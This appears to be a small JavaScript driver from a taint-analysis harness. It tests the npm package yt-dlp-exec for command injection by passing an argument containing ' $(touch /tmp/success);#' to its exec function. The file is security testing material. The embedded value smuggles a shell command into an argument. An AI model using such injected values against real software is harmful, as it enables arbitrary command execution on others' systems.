// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/yt-dlp-exec/node_modules/yt-dlp-exec');
try {
	var x0 = [{"args":" $(touch /tmp/success);#"}];
var x1 = {};
var x2 = {};
PUT["exec"](x0,x1,x2)();
} catch (e) {
	console.log(e);
}